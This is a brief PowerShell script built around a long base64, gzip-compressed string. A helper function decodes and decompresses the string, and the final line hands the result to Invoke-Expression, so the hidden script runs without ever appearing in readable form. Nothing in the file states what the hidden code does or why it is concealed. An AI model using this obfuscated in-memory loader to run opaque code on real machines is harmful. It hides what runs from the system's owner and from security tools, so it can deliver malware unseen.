
$ScriptString = "H4sIAAAAAAAACq1UbU+jQBD+TsJ/4LzeucSyqdVcjIZLKF0rSaUNrOeZprkgjBal0FumV5s7//st1VYKPT8dn5Z5eeaZZ2ZXVUb2NEoAO3Eaxek98eezWSYw9yfZPImGIgshz/WxqswCEUyJrioNK4qENGqmtvflmLbbJ7R91KJHJ3vSN5S50tFutVqH8pcJkQkrxDhLhwLuQEAagvTv+5jN9lUFxVJVfquKJr+GH4p4hqeW51k3XYtbMm7kL3OEKe0sEUbj8empLSBAcNIcA4lEyv5x87DVPtbPVmgf/y/cGzuX8SH3TBcWxuD2AULUXnNcQOpn4SNgTrk9tJMYUiRrsZorZfRXsMUkToCsIT37W8HP3C5Bewx97jHrkujrvFel1hCsCkGjAAPrl+Uk1m0fNCMTWinCZdedG858zYCfdXmonc3dDcPtYmUBSkBmtbwHQZfUkJutZr1awtweXmzkrRSRjTturwg8MIkL18ag88Ck1gYuh8y1pqDly5yzS4rwxKmV204MbphFjnuv03vGi3y5zO9RKfWhP1doxHekzqQkzQ55tuiz78z2mH/V575JYva0C6399fPhn8EVGj56cdqrKlF8dYtzRz6QHVVoH9IeTj7VdQ4H85RvFqjMf2eBf3RxYO7J210NfFaVunGdPeAXzFvtNRmtpgSunXXlVOS1C+TAnGJQ2LlByHd1pJ9Vl2shYv52aTbwpZFubC9y1LarTG+Net6f+xPyXuTbzMxGetVPtiOlBjuOLydVeQ4DDCelVZHP6sJgTyHMijexCxjESa41fmhG4fExCB9lVqHrX75ZmpyaBQAA"



function Convert-FromBase64CompressedScriptBlock {

    [CmdletBinding()] param(
        [String]
        $ScriptBlock
    )

    # Base64 to Byte array of compressed data
    $ScriptBlockCompressed = [System.Convert]::FromBase64String($ScriptBlock)

    # Decompress data
    $InputStream = New-Object System.IO.MemoryStream(, $ScriptBlockCompressed)
    $MemoryStream = New-Object System.IO.MemoryStream
    $GzipStream = New-Object System.IO.Compression.GzipStream $InputStream, ([System.IO.Compression.CompressionMode]::Decompress)
    $GzipStream.CopyTo($MemoryStream)
    $GzipStream.Close()
    $MemoryStream.Close()
    $InputStream.Close()
    [Byte[]] $ScriptBlockEncoded = $MemoryStream.ToArray()

    # Byte array to String
    [System.Text.Encoding] $Encoding = [System.Text.Encoding]::UTF8
    $Encoding.GetString($ScriptBlockEncoded) | Out-String
}


$Data = Convert-FromBase64CompressedScriptBlock $ScriptString

iex $Data